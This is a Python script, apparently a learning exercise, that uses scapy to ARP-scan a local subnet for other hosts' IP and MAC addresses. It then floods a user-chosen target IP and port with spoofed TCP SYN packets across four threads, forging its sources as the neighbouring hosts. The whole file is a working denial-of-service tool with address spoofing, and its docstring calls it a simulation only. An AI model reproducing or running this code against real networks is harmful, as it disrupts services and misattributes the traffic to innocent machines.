import scapy.all as sc
import threading
import random


def get_net_info():
    ''' 本函数是用于获取当前网络内指定IP段的IP地址,
        这些IP地址将用作网络攻击数据表包的伪造 '''
    arp = sc.ARP(pdst='10.1.0.0/22')  # 最长前缀匹配长度为22
    ether = sc.Ether(dst='ff:ff:ff:ff:ff:ff')  # 目的MAC全是F则代表为广播地址
    packet = ether / arp  # 此步为构建数据包
    response = sc.srp(packet, timeout=2, verbose = False)[0]  # response为收到的返回包

    #将获取到的IP地址和Mac地址存放在对应的列表中
    list_ip, list_mac = [], []
    #解析收到的包，提取出需要的IP地址和MAC地址
    for s, r in response:
        if r.psrc[-1] != '1':  # 筛选IP地址末尾不为1的IP,因为末尾为1在该网络中默认为交换机
            list_ip.append(r.psrc)
            list_mac.append(r.hwsrc)
    return list_ip, list_mac


def Syn_Flood_Attack(target_mac, target_ip, target_port, re_num):
    ''' 本函数用于模拟SYN Flood泛洪攻击 '''
    global attack_num, ip_net, mac_net
    while attack_num:
        attack_num -= 1
        index = random.randrange(0, re_num)      # 随机生成索引值，用于选主机
        s_port = random.randrange(1024, 65535)   # 随机产生一个源端口号
        s_seq = random.randrange(0, 3000)        # 随机产生一个源序列号
        #伪造一个SYN包（flags置为S时表示发送为SYN)
        etherlayer = sc.Ether(src=mac_net[index], dst=target_mac)                 # 数据链路层
        iplayer = sc.IP(src=ip_net[index], dst=target_ip)                         # 网络层
        tcplayer = sc.TCP(dport=target_port, sport=s_port, flags='S', seq=s_seq)  # 传输层
        packet = etherlayer / iplayer / tcplayer  
        sc.sendp(packet, verbose=False)   # verbose设置为False，则此时不会再显示发包的详细信息
        

ip_net, mac_net = get_net_info()  # 首先获取当前网络内的其他主机的信息
print('当前网络内其他主机的IP地址为:')
print(ip_net)
des_ip = input('请输入您想要攻击的目的主机的IP地址: ')
des_port = int(input('请输入想要攻击的端口号: '))
attack_num = int(input('请选择您想要发送的攻击包数量: '))

position = ip_net.index(des_ip)  # 根据IP地址查询其索引值
des_mac = mac_net[position]  # 根据索引值查询目的IP地址对应的MAC地址
del ip_net[position]  # 删除对应的列表元素
del mac_net[position]
remain = len(ip_net)  # 获取当前可用的IP地址个数

# 启用四个线程来加快攻击速度
for i in range(4):
    tr = threading.Thread(target=Syn_Flood_Attack, args=(des_mac, des_ip, des_port, remain))
    tr.start()
    